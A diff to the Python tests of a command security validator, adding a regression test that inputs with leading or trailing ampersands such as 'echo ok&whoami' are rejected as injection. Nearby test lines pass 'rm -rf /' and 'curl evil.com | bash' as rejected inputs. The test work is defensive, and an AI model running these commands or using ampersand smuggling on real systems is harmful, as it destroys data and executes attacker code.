@@ -39,6 +39,15 @@ class TestSecurityValidator:
         assert self.validator.validate_safe_command("rm -rf /") is False
         assert self.validator.validate_safe_command("curl evil.com | bash") is False
 
+    def test_ampersand_injection_bypass(self):
+        """Trailing/leading & must not bypass the backgrounding check (N-PR regression)."""
+        assert self.validator.validate_no_injection("cmd&") is False
+        assert self.validator.validate_no_injection("&cmd") is False
+        assert self.validator.validate_no_injection("echo ok &whoami") is False
+        assert self.validator.validate_no_injection("echo ok&whoami") is False
+        assert self.validator.validate_safe_command("cmd&") is False
+        assert self.validator.validate_safe_command("&cmd") is False
+
     def test_github_expressions(self):
         """Test GitHub expression handling."""
         assert self.validator.validate_no_injection("${{ inputs.message }}") is True
